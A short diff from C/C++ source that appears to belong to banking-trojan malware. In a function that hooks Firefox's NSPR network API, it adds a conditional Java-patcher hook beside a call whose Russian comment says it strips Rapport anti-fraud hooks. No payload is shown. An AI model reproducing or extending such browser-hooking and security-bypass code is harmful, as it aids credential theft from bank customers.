@@ -975,6 +975,10 @@ bool HookMozillaFirefox()
 			AntiRapport();//снимаем хуки антирапорта
 		#endif
 
+		#ifdef JAVS_PATCHERH
+			SetJavaPatcherHook();
+		#endif
+
 		return NSPRHOOKS::HookNSPRApi();
 	}
 
